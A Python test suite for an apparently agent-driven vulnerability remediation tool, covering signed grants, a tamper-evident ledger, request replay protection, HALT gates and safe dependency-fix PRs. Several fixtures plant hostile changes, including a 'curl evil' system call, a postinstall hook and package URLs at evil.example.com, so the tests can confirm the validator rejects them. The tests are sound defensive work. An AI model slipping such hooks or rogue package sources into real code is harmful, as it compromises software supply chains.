"""agentteams.vulnscan grant / ledger / executor / review (P1 + P5). Network-free.

Real Ed25519 keys (``cryptography``, the ``[signing]`` extra), a local bare git remote, and a fake
``gh`` on PATH. HOME and the vulnscan config/state dirs point into tmp_path.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

pytest.importorskip("cryptography")
from cryptography.hazmat.primitives import serialization  # noqa: E402
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey  # noqa: E402

from agentteams.cli.signed_ledger import ed25519_sign  # noqa: E402
from agentteams.vulnscan import executor, fix, grant, ledger, review  # noqa: E402

GIT = shutil.which("git")


@pytest.fixture
def env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> dict:
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("AGENTTEAMS_VULNSCAN_CONFIG_DIR", str(home / ".config" / "agentteams"))
    monkeypatch.setenv("AGENTTEAMS_VULNSCAN_STATE_DIR", str(tmp_path / "state"))
    monkeypatch.setenv("AGENTTEAMS_SERVER_KIT_DIR", str(tmp_path / "kit"))
    key = Ed25519PrivateKey.generate()
    vk = home / ".config" / "agentteams" / "verify-keys"
    vk.mkdir(parents=True)
    os.chmod(vk, 0o700)
    (vk / "op.pub.pem").write_bytes(key.public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo))
    pem = key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
                            serialization.NoEncryption()).decode()
    gov = tmp_path / "govteam"
    (gov / "references").mkdir(parents=True)
    (gov / "references" / "security-decisions.log.csv").write_text(
        "date,plan_slug,step,decision,status,conditions,conditions_verified,evidence,owner\n")
    return {"pem": pem, "home": home, "gov": gov, "tmp": tmp_path,
            "cfg": {"governance_dir": str(gov), "cooldown_days": 14}}


def _install(env: dict, **kw: object) -> dict:
    args = {"ops": ["stage-fix", "open-pr", "server-audit"], "repo_roots": [str(env["tmp"] / "repos")],
            "hosts": ["web1"], "days": 7, "max_uses": 5, "key_id": "op", "governance_dir": str(env["gov"])}
    args.update(kw)
    (env["tmp"] / "repos").mkdir(exist_ok=True)
    rec = grant.build(**args)  # type: ignore[arg-type]
    signed = {**rec, "signature": ed25519_sign(env["pem"], grant.signed_values(rec))}
    grant.install(signed)
    return signed


# ---------------------------------------------------------------- grant

def test_build_enforces_v1_bounds(env: dict) -> None:
    gov = str(env["gov"])
    with pytest.raises(grant.GrantError, match="reserved"):
        grant.build(ops=["merge"], repo_roots=["/x"], hosts=[], days=1, max_uses=1, key_id="op", governance_dir=gov)
    with pytest.raises(grant.GrantError):
        grant.build(ops=["server-audit"], repo_roots=[], hosts=["all"], days=1, max_uses=1, key_id="op", governance_dir=gov)
    with pytest.raises(grant.GrantError):
        grant.build(ops=["stage-fix"], repo_roots=[str(Path.home())], hosts=[], days=1, max_uses=1, key_id="op",
                    governance_dir=gov)
    with pytest.raises(grant.GrantError):
        grant.build(ops=["server-audit"], repo_roots=[], hosts=["h"], days=31, max_uses=1, key_id="op", governance_dir=gov)
    with pytest.raises(grant.GrantError, match="governance_dir"):
        grant.build(ops=["server-audit"], repo_roots=[], hosts=["h"], days=1, max_uses=1, key_id="op",
                    governance_dir=str(env["tmp"]))


def test_signed_grant_verifies_and_tampering_fails(env: dict) -> None:
    g = _install(env)
    valid, problems = grant.load_active()
    assert [v["grant_id"] for v in valid] == [g["grant_id"]] and not problems
    assert grant.covers(g, "server-audit", "web1") and not grant.covers(g, "server-audit", "web2")
    assert grant.covers(g, "stage-fix", str(env["tmp"] / "repos" / "a")) and not grant.covers(g, "stage-fix", "/etc")
    path = grant.grants_dir() / f"{g['grant_id']}.json"
    widened = {**g, "hosts": ["web1", "db1"]}
    path.write_text(json.dumps(widened))
    valid, problems = grant.load_active()
    assert not valid and "signature" in problems[0]


def test_expired_grant_and_aggregate_cap(env: dict) -> None:
    g = _install(env)
    later = datetime.fromisoformat(g["expires"]) + timedelta(seconds=1)
    assert grant.load_active(now=later)[0] == []
    _install(env)
    _install(env)
    valid, problems = grant.load_active()
    assert valid == [] and "aggregate cap" in problems[-1]


# ---------------------------------------------------------------- ledger

def test_ledger_chain_detects_tampering(env: dict) -> None:
    with ledger.locked():
        ledger.append("begun", grant_id="vg-x", op="server-audit", target="web1", request_id="r1")
        ledger.append("done", grant_id="vg-x", op="server-audit", target="web1", request_id="r1")
    assert [r["kind"] for r in ledger.read()] == ["begun", "done"]
    assert ledger.uses("vg-x") == 1 and ledger.consumed_request_ids() == {"r1"}
    p = ledger.ledger_path()
    lines = p.read_text().splitlines()
    forged = json.loads(lines[1])
    forged["detail"] = "forged"
    p.write_text(lines[0] + "\n" + json.dumps(forged) + "\n")
    with pytest.raises(ValueError, match="altered"):
        ledger.read()
    assert "INTEGRITY FAILURE" in review.build()


# ---------------------------------------------------------------- authorization

def test_act_refuses_without_grant_governance_or_under_halt(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    res = executor.act("server-audit", "web1", env["cfg"])
    assert res["status"] == "refused" and "not authorized" in res["detail"]
    _install(env)
    log = env["gov"] / "references" / "security-decisions.log.csv"
    saved = log.read_text()
    log.unlink()
    res = executor.act("server-audit", "web1", {"governance_dir": "/ignored/unsigned/config"})
    assert res["status"] == "refused" and "decision log" in res["detail"]
    log.write_text(saved)
    from agentteams.cli import decision_log

    def halt(_dir: Path, *, action: str) -> None:
        raise RuntimeError(f"HALT {action}")
    monkeypatch.setattr(decision_log, "_assert_no_unretracted_halt", halt)
    res = executor.act("server-audit", "web1", env["cfg"])
    assert res["status"] == "refused" and "HALT" in res["detail"]
    assert all(r["kind"] == "refused" for r in ledger.read())


def test_use_cap_is_enforced(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    _install(env, max_uses=1)
    monkeypatch.setattr(executor, "server_op", lambda op, host: {"host": host, "log": "x"})
    assert executor.act("server-audit", "web1", env["cfg"])["status"] == "done"
    second = executor.act("server-audit", "web1", env["cfg"])
    assert second["status"] == "refused" and "exhausted" in second["detail"]


def test_server_op_rejects_unknown_hosts_and_all(env: dict) -> None:
    kit = env["tmp"] / "kit"
    kit.mkdir()
    (kit / "hosts.conf").write_text("web1 | deploy@web1.example.com | x\n")
    for bad in ("all", "web2"):
        with pytest.raises(executor.ExecError):
            executor.server_op("server-audit", bad)


# ---------------------------------------------------------------- spool

def test_spool_rejects_malformed_symlinked_and_replayed_requests(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    _install(env)
    monkeypatch.setattr(executor, "server_op", lambda op, host: {"host": host, "log": "x"})
    req = executor.spool_dir() / "requests"
    req.mkdir(parents=True)
    rid = "a" * 32
    (req / f"{rid}.json").write_text(json.dumps({"id": rid, "op": "server-audit", "target": "web1", "rationale": "audit"}))
    (req / ("b" * 32 + ".json")).write_text(json.dumps({"id": "b" * 32, "op": "server-audit", "target": "web1",
                                                         "extra": "--apply"}))
    outside = env["tmp"] / "secret.json"
    outside.write_text("{}")
    (req / ("c" * 32 + ".json")).symlink_to(outside)
    results = executor.serve_requests(env["cfg"])
    assert [r["status"] for r in results] == ["done"]
    kinds = [r["kind"] for r in ledger.read()]
    assert kinds.count("refused") == 2 and kinds.count("done") == 1
    (req / f"{rid}.json").write_text(json.dumps({"id": rid, "op": "server-audit", "target": "web1"}))
    executor.serve_requests(env["cfg"])
    assert "replay" in ledger.read()[-1]["detail"]
    assert "rejected spool file" in review.build()


# ---------------------------------------------------------------- repo ops (real git)

def _repo_with_remote(tmp: Path) -> Path:
    remote = tmp / "remote.git"
    subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(remote)], check=True)
    repo = tmp / "repos" / "svc"
    repo.mkdir(parents=True)
    run = lambda *a: subprocess.run(["git", "-C", str(repo), *a], check=True, capture_output=True)  # noqa: E731
    run("init", "-q", "-b", "main")
    run("config", "user.email", "t@example.com")
    run("config", "user.name", "t")
    (repo / "requirements.txt").write_text("PyJWT==2.3.0\nflask>=3\n")
    (repo / "app.py").write_text("print('hi')\n")
    run("add", "-A")
    run("commit", "-q", "-m", "init")
    # A GitHub-style origin (open-pr derives the PR's repository from it), rewritten to the local bare repo.
    run("remote", "add", "origin", "https://github.com/o/svc.git")
    run("config", f"url.{remote}.insteadOf", "https://github.com/o/svc.git")
    run("push", "-q", "origin", "main")
    run("remote", "set-head", "origin", "main")
    return repo


@pytest.mark.skipif(not GIT, reason="git not available")
def test_stage_fix_and_open_pr_end_to_end(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-fix", "open-pr"], hosts=[])

    def fake_fix(root: Path, **kw: object) -> fix.FixResult:
        req = root / "requirements.txt"
        req.write_text(req.read_text().replace("PyJWT==2.3.0", "PyJWT==2.15.0"))
        return fix.FixResult(changes=[fix.PinChange("requirements.txt", "PyJWT", "2.3.0", "2.15.0")], applied=True)

    monkeypatch.setattr(fix, "fix_path", fake_fix)
    staged = executor.act("stage-fix", str(repo), env["cfg"], rationale="critical PyJWT")
    assert staged["status"] == "done" and staged["branch"].startswith("vulnscan/")
    assert staged["changed"] == ["requirements.txt"]
    assert not Path(staged["worktree"]).is_relative_to(repo)          # executor-owned, outside the checkout

    bindir = env["tmp"] / "bin"
    bindir.mkdir()
    (bindir / "gh").write_text('#!/bin/sh\necho "$@" > "$(dirname "$0")/gh.args"\n'
                               'echo https://github.example.com/o/svc/pull/7\n')
    (bindir / "gh").chmod(0o755)
    monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")
    pr = executor.act("open-pr", str(repo), env["cfg"], rationale="please @someone merge ```x```")
    assert pr["status"] == "done" and pr["pr"].endswith("/pull/7")
    gh_args = (bindir / "gh.args").read_text()
    assert "--repo github.com/o/svc " in gh_args                      # never left to gh's remote resolution
    heads = subprocess.run(["git", "-C", str(env["tmp"] / "remote.git"), "branch"], capture_output=True, text=True).stdout
    assert staged["branch"] in heads
    again = executor.act("open-pr", str(repo), env["cfg"])
    assert again["status"] == "failed" and "already exists" in again["detail"]
    body = next(Path(staged["worktree"]).parent.glob("*.pr.md")).read_text()
    assert "@​someone" in body and "```x```" not in body
    md = review.build()
    assert "/pull/7" in md and "open-pr" in md
    review.acknowledge("looked fine")
    assert "0 rows in this review window" in review.build()


@pytest.mark.skipif(not GIT, reason="git not available")
def test_stage_fix_rejects_changes_outside_pins(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-fix"], hosts=[])

    def evil_fix(root: Path, **kw: object) -> fix.FixResult:
        (root / "app.py").write_text("import os; os.system('curl evil')\n")
        return fix.FixResult(applied=True)

    monkeypatch.setattr(fix, "fix_path", evil_fix)
    res = executor.act("stage-fix", str(repo), env["cfg"])
    assert res["status"] == "failed" and "outside dependency pins" in res["detail"]

    def flask_rename(root: Path, **kw: object) -> fix.FixResult:
        req = root / "requirements.txt"
        req.write_text(req.read_text().replace("flask>=3", "flask @ https://evil.example.com/flask.whl"))
        return fix.FixResult(applied=True)

    monkeypatch.setattr(fix, "fix_path", flask_rename)
    res = executor.act("stage-fix", str(repo), env["cfg"])
    assert res["status"] == "failed" and "non-pin line" in res["detail"]


def test_lockfile_registry_allowlist(env: dict, tmp_path: Path) -> None:
    if not GIT:
        pytest.skip("git not available")
    repo = tmp_path / "r"
    repo.mkdir()
    subprocess.run(["git", "-C", str(repo), "init", "-q"], check=True)
    lock = {"packages": {"": {"dependencies": {"a": "^1"}}, "node_modules/a": {"version": "1.0.0",
            "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz"}}}
    (repo / "package-lock.json").write_text(json.dumps(lock))
    subprocess.run(["git", "-C", str(repo), "add", "-A"], check=True)
    subprocess.run(["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-qm", "i"], check=True)
    base = subprocess.run(["git", "-C", str(repo), "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()
    lock["packages"]["node_modules/a"]["resolved"] = "https://evil.example.com/a.tgz"
    (repo / "package-lock.json").write_text(json.dumps(lock))
    with pytest.raises(executor.ExecError, match="registry allowlist"):
        executor.validate_diff(repo, base)
    lock["packages"]["node_modules/a"]["resolved"] = "https://registry.npmjs.org/a/-/a-1.0.1.tgz"
    lock["packages"][""]["scripts"] = {"postinstall": "curl evil"}
    (repo / "package-lock.json").write_text(json.dumps(lock))
    with pytest.raises(executor.ExecError, match="root package scripts"):
        executor.validate_diff(repo, base)


def test_review_overdue_and_window(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    _install(env)
    monkeypatch.setattr(executor, "server_op", lambda op, host: {"host": host, "report": "r.md"})
    executor.act("server-audit", "web1", env["cfg"], rationale="daily")
    assert not review.overdue(days=3)
    assert review.overdue(days=-1)
    md = review.build(since=datetime.now(UTC).date().isoformat())
    assert "server-audit" in md and "1/5 uses" in md


def test_a_real_target_tagged_halt_row_stops_every_grant_use(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    """Through the real C-2 gate: a HALT on `vulnscan-remediation:web1` blocks web1 and every other target."""
    _install(env, hosts=["web1", "web2"])
    monkeypatch.setattr(executor, "server_op", lambda op, host: {"host": host})
    log = env["gov"] / "references" / "security-decisions.log.csv"
    with log.open("a") as fh:
        fh.write("2026-10-22,vulnscan,s1,vulnscan-remediation:web1,HALT,,,suspected compromise,security\n")
    for host in ("web1", "web2"):
        res = executor.act("server-audit", host, env["cfg"])
        assert res["status"] == "refused" and "HALT" in res["detail"], res


@pytest.mark.skipif(not GIT, reason="git not available")
def test_cooldown_cannot_be_lowered_below_s10(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-fix"], hosts=[])
    seen = {}

    def spy(root: Path, **kw: object) -> fix.FixResult:
        seen.update(kw)
        return fix.FixResult(applied=True)

    monkeypatch.setattr(fix, "fix_path", spy)
    executor.act("stage-fix", str(repo), {**env["cfg"], "cooldown_days": 0})
    assert seen["cooldown_days"] == executor.MIN_COOLDOWN_DAYS


def test_ledger_tail_truncation_and_deletion_are_detected(env: dict) -> None:
    with ledger.locked():
        for i in range(3):
            ledger.append("note", detail=str(i))
    p = ledger.ledger_path()
    lines = p.read_text().splitlines()
    p.write_text("\n".join(lines[:2]) + "\n")          # drop the last row: the chain itself still verifies
    with pytest.raises(ValueError, match="removed from its end"):
        ledger.read()
    p.unlink()
    with pytest.raises(ValueError, match="ledger was removed"):
        ledger.read()


# ---------------------------------------------------------------- R6 Phase 0 (M0.7–M0.10)

def _req(env: dict, rid: str, **body: object) -> Path:
    d = executor.spool_dir() / "requests"
    d.mkdir(parents=True, exist_ok=True)
    p = d / f"{rid}.json"
    p.write_text(json.dumps({"id": rid, **body}))
    return p


def test_payload_schema_and_size_caps(env: dict) -> None:
    ok = _req(env, "1" * 32, op="report", target="run", payload={"markdown": "x" * 100_000})
    assert executor._read_request(ok)["payload"]["markdown"]          # > 64 KiB allowed for report only
    big = _req(env, "2" * 32, op="server-audit", target="web1", rationale="y" * 70_000)
    with pytest.raises(executor.ExecError, match="too large"):
        executor._read_request(big)
    for rid, body in (("3" * 32, {"op": "escalate", "target": "x", "payload": {"kind": "escalation-flood", "evidence": "e"}}),
                      ("4" * 32, {"op": "server-audit", "target": "web1", "payload": {"markdown": "m"}}),
                      ("5" * 32, {"op": "report", "target": "run"}),
                      ("6" * 32, {"op": "escalate", "target": "x", "payload": {"kind": "ioc"}})):
        with pytest.raises(executor.ExecError):
            executor._read_request(_req(env, rid, **body))


def test_canonical_target(env: dict, tmp_path: Path) -> None:
    if not GIT:
        pytest.skip("git not available")
    repo = tmp_path / "r"
    (repo / "sub").mkdir(parents=True)
    subprocess.run(["git", "-C", str(repo), "init", "-q"], check=True)
    kit = env["tmp"] / "kit"
    kit.mkdir(exist_ok=True)
    (kit / "hosts.conf").write_text("web1 | deploy@web1.example.com | x\n")
    assert executor.canonical_target(str(repo / "sub")) == str(repo.resolve())
    assert executor.canonical_target("web1") == "web1"
    assert executor.canonical_target("not-a-host") is None and executor.canonical_target(str(tmp_path / "nope")) is None


def test_broken_ledger_refuses_without_raising(env: dict) -> None:
    _install(env)
    with ledger.locked():
        ledger.append("note", detail="x")
    ledger.ledger_path().write_text("")                         # truncated below the high-water mark
    res = executor.act("server-audit", "web1", env["cfg"])
    assert res["status"] == "refused" and "integrity" in res["detail"]
    assert executor.serve_requests(env["cfg"])[0]["status"] == "refused"


def test_internal_ops_are_processed_first_and_run_ids(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    order: list[str] = []
    monkeypatch.setattr(executor, "act", lambda op, target, cfg, **kw: order.append(op) or {"status": "done"})
    _req(env, "a" * 32, op="server-audit", target="web1", rationale="r")
    _req(env, "b" * 32, op="report", target="run", payload={"markdown": "m"})
    _req(env, "c" * 32, op="escalate", target="web1", payload={"kind": "ioc", "evidence": "e"})
    executor.serve_requests(env["cfg"])
    assert order == ["escalate", "report", "server-audit"]
    rid = executor.new_run_id(Path("/x/2026-10-22"))
    assert rid.startswith("2026-10-22-") and len(rid) == len("2026-10-22-") + 6


# ---------------------------------------------------------------- R6 Phase 2 (I2): internal ops wired

def test_escalate_blocks_its_scope_notifies_and_dedupes(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    from agentteams.vulnscan import escalations, notify
    _install(env, hosts=["web1", "web2"])
    kit = env["tmp"] / "kit"
    kit.mkdir()
    (kit / "hosts.conf").write_text("web1 | d@web1.example.com | x\nweb2 | d@web2.example.com | x\n")
    sent: list[tuple] = []
    monkeypatch.setattr(notify, "send", lambda cfg, key, **f: sent.append((key, f)) or True)
    monkeypatch.setattr(executor, "server_op", lambda op, host: {"host": host, "log": "x"})
    res = executor.act("escalate", "web1", env["cfg"], payload={"kind": "other", "evidence": "odd cron entry"},
                       run_id="r1")
    assert res["status"] == "done" and res["new"] and res["scope"] == "web1"
    assert sent == [("escalation", {"id": res["escalation"], "kind": "other"})]   # never the evidence
    again = executor.act("escalate", "web1", env["cfg"], payload={"kind": "other", "evidence": "same"}, run_id="r1")
    assert again["escalation"] == res["escalation"] and not again["new"] and len(sent) == 1
    blocked = executor.act("server-audit", "web1", env["cfg"])
    assert blocked["status"] == "refused" and res["escalation"] in blocked["detail"]
    assert executor.act("server-audit", "web2", env["cfg"])["status"] == "done"      # scoped, not global
    escalations.resolve_other(res["escalation"], "checked: operator's own cron job")
    assert executor.act("server-audit", "web1", env["cfg"])["status"] == "done"
    executor.act("escalate", "web2", env["cfg"], payload={"kind": "ioc", "evidence": "x"}, run_id="r1")
    assert executor.act("server-audit", "web1", env["cfg"])["status"] == "refused"   # ioc blocks everything


def test_report_needs_a_run_and_is_stored(env: dict) -> None:
    from agentteams.vulnscan import report_store
    res = executor.act("report", "run", env["cfg"], payload={"markdown": "# r"})
    assert res["status"] == "refused" and "run" in res["detail"]
    run = env["tmp"] / "state" / "2026-10-22"
    run.mkdir(parents=True)
    assert executor.act("report", "run", env["cfg"], payload={"markdown": "# hello"}, run_dir=run)["status"] == "done"
    assert "# hello" in (report_store.load(run) or "")
    assert ledger.read()[-1]["kind"] == "done"


def test_spooled_escalation_is_replay_protected(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    from agentteams.vulnscan import notify
    monkeypatch.setattr(notify, "send", lambda *a, **k: True)
    rid = "d" * 32
    _req(env, rid, op="escalate", target="/nowhere", payload={"kind": "other", "evidence": "e"})
    assert executor.serve_requests(env["cfg"], run_id="r2")[0]["scope"] == "*"     # unknown target: fail safe
    _req(env, rid, op="escalate", target="/nowhere", payload={"kind": "other", "evidence": "e"})
    executor.serve_requests(env["cfg"], run_id="r2")
    assert "replay" in ledger.read()[-1]["detail"]


def test_a_worktree_canonicalises_to_its_main_repository(env: dict, tmp_path: Path) -> None:
    if not GIT:
        pytest.skip("git not available")
    repo = tmp_path / "main"
    repo.mkdir()
    for args in (["init", "-q"], ["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "--allow-empty", "-m", "x"],
                 ["worktree", "add", "-q", str(tmp_path / "wt"), "-b", "side"]):
        subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True)
    assert executor.canonical_target(str(tmp_path / "wt")) == str(repo.resolve())


def test_act_rechecks_a_used_request_id_under_the_lock(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    _install(env)
    monkeypatch.setattr(executor, "server_op", lambda op, host: {"host": host, "log": "x"})
    assert executor.act("server-audit", "web1", env["cfg"], request_id="e" * 32)["status"] == "done"
    again = executor.act("server-audit", "web1", env["cfg"], request_id="e" * 32)       # a second server's copy
    assert again["status"] == "refused" and "replay" in again["detail"]
    assert [r["kind"] for r in ledger.read()].count("done") == 1


def test_stale_requests_are_quarantined_with_one_row(env: dict) -> None:
    for i in range(5):
        _req(env, f"{i:x}" * 32, op="server-audit", target="web1")
    assert executor.quarantine_pending("left over") == 5
    assert not list((executor.spool_dir() / "requests").glob("*.json"))
    assert [r["op"] for r in ledger.read()] == ["(stale)"]


def test_a_spool_flood_opens_one_escalation_and_the_deadline_stops_a_pass(env: dict,
                                                                         monkeypatch: pytest.MonkeyPatch) -> None:
    from agentteams.vulnscan import escalations, notify
    sent: list[str] = []
    monkeypatch.setattr(notify, "send", lambda cfg, key, **f: sent.append(key) or True)
    monkeypatch.setattr(executor, "MAX_REQUESTS_PER_PASS", 3)
    for i in range(5):
        _req(env, f"{i:x}" * 32, op="server-audit", target="web1")
    out = executor.serve_requests(env["cfg"], run_id="r1", deadline=0.0)   # deadline already passed
    assert out == [] and len(list((executor.spool_dir() / "requests").glob("*.json"))) == 3
    assert len(list((executor.spool_dir() / "processed").glob("overflow-*"))) == 2
    assert [e.kind for e in escalations.open_escalations()] == [escalations.FLOOD_KIND] and sent == ["escalation"]
    executor.serve_requests(env["cfg"], run_id="r1")
    assert [e.kind for e in escalations.open_escalations()] == [escalations.FLOOD_KIND]   # no second flood


def test_repo_ops_never_touch_the_publish_ops_repo(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    from agentteams.vulnscan import publish
    ops = env["tmp"] / "repos" / "ops"
    publish.grants_dir().mkdir(parents=True)
    # an unsigned / expired grant file still narrows: the guard never depends on the grant being valid
    (publish.grants_dir() / "vp-0000000000000000.json").write_text(json.dumps({"ops_repo": str(ops)}))
    assert publish.load_active()[0] == []
    with ledger.locked():
        with pytest.raises(executor.ExecError, match="ops repository"):
            executor.authorize("stage-fix", str(ops), "x", env["cfg"])


def _git_repo(path: Path) -> Path:
    path.mkdir(parents=True)
    for args in (["init", "-q"], ["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "--allow-empty", "-m", "x"]):
        subprocess.run(["git", "-C", str(path), *args], check=True, capture_output=True)
    return path


@pytest.mark.skipif(not GIT, reason="git not available")
def test_p7_repo_ops_refuse_protected_repositories_by_common_dir(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    import agentteams
    from agentteams.vulnscan import publish
    tmp = env["tmp"]
    pkg_repo = _git_repo(tmp / "repos" / "agentteams-checkout")
    (pkg_repo / "agentteams").mkdir()
    monkeypatch.setattr(agentteams, "__file__", str(pkg_repo / "agentteams" / "__init__.py"))
    wt = tmp / "repos" / "agentteams-wt"
    subprocess.run(["git", "-C", str(pkg_repo), "worktree", "add", "-q", str(wt), "-b", "side"],
                   check=True, capture_output=True)
    team = _git_repo(tmp / "repos" / "team")
    gov_repo = _git_repo(tmp / "repos" / "gov")
    (gov_repo / "references").mkdir()
    # an unsigned, invalid grant file still narrows: only its governance_dir is read
    grant.grants_dir().mkdir(parents=True)
    (grant.grants_dir() / "vg-junk.json").write_text(json.dumps({"governance_dir": str(gov_repo / "references")}))
    publish.grants_dir().mkdir(parents=True)
    pub_gov = _git_repo(tmp / "repos" / "pubgov")
    (publish.grants_dir() / "vp-junk.json").write_text(json.dumps({"governance_dir": str(pub_gov), "ops_repo": "/nope"}))
    (publish.grants_dir() / "vp-bad.json").write_text("{not json")
    unrelated = _git_repo(tmp / "repos" / "unrelated")
    cfg = {**env["cfg"], "agent": {"team_dir": str(team)}}
    for target in (wt, pkg_repo, team, gov_repo, pub_gov):
        with ledger.locked():
            with pytest.raises(executor.ExecError, match="same repository"):
                executor.authorize("stage-fix", str(target), "x", cfg)
    with ledger.locked():                                    # an unrelated repo only lacks a grant
        with pytest.raises(executor.ExecError, match="not authorized"):
            executor.authorize("open-pr", str(unrelated), "x", cfg)
    assert executor.repo_identity(tmp / "missing") is None and executor.repo_identity(Path("relative")) is None
    res = executor.act("stage-fix", str(wt), cfg)
    assert res["status"] == "refused" and "same repository" in res["detail"]


def test_origin_repo_forms_and_refusal(env: dict, tmp_path: Path) -> None:
    if not GIT:
        pytest.skip("git not available")
    repo = tmp_path / "r"
    subprocess.run(["git", "init", "-q", str(repo)], check=True)
    for url, want in (("https://github.com/o/svc.git", "github.com/o/svc"),
                      ("git@github.com:o/svc.git", "github.com/o/svc"),
                      ("ssh://git@ghe.example.com:2222/team/app", "ghe.example.com/team/app"),
                      ("https://github.com/o/svc", "github.com/o/svc")):
        subprocess.run(["git", "-C", str(repo), "remote", "remove", "origin"], capture_output=True)
        subprocess.run(["git", "-C", str(repo), "remote", "add", "origin", url], check=True)
        assert executor._origin_repo(repo) == want, url
    subprocess.run(["git", "-C", str(repo), "remote", "set-url", "origin", str(tmp_path / "bare.git")], check=True)
    with pytest.raises(executor.ExecError, match="not a GitHub repository URL"):
        executor._origin_repo(repo)


@pytest.mark.skipif(not GIT, reason="git not available")
def test_open_pr_checks_origin_before_pushing(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-fix", "open-pr"], hosts=[])

    def fake_fix(root: Path, **kw: object) -> fix.FixResult:
        req = root / "requirements.txt"
        req.write_text(req.read_text().replace("PyJWT==2.3.0", "PyJWT==2.15.0"))
        return fix.FixResult(changes=[fix.PinChange("requirements.txt", "PyJWT", "2.3.0", "2.15.0")], applied=True)

    monkeypatch.setattr(fix, "fix_path", fake_fix)
    assert executor.act("stage-fix", str(repo), env["cfg"])["status"] == "done"
    subprocess.run(["git", "-C", str(repo), "remote", "set-url", "origin", str(env["tmp"] / "remote.git")], check=True)
    res = executor.act("open-pr", str(repo), env["cfg"])
    assert res["status"] == "failed" and "not a GitHub repository URL" in res["detail"]
    heads = subprocess.run(["git", "-C", str(env["tmp"] / "remote.git"), "branch"], capture_output=True, text=True).stdout
    assert "vulnscan/" not in heads                                   # nothing was pushed


def test_a_hung_repository_check_refuses_instead_of_crashing(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    def hang(path: Path) -> Path:
        raise subprocess.TimeoutExpired("git", 30)
    monkeypatch.setattr(executor, "repo_identity", hang)
    with pytest.raises(executor.ExecError, match="in time; refusing"):
        executor._refuse_protected_repos(str(env["tmp"]), env["cfg"])
